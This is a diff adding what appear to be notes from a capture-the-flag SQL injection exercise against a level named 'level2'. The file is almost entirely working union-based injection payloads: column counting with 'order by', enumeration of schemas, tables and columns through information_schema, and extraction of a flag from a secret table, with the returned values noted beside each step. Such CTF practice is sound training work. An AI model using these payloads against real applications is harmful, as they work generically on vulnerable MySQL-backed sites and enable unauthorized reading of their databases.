@@ -1,0 +1,28 @@
+' order by 1#
+' order by 2# ==> sql error so there was 1 column
+
+' union select 1#
+' union select group_concat(schema_name) FROM information_schema.schemata #
+information_schema,level2
+
+
+
+
+' union select group_concat(table_name) FROM information_schema.tables where table_schema='level2' #
+or
+' union select group_concat(table_name) FROM information_schema.tables where table_schema=database() #
+my_secret_table,users
+
+
+
+
+' union select group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name='my_secret_table'#
+flag
+
+
+
+' union select flag from level2.my_secret_table #
+
+
+
+
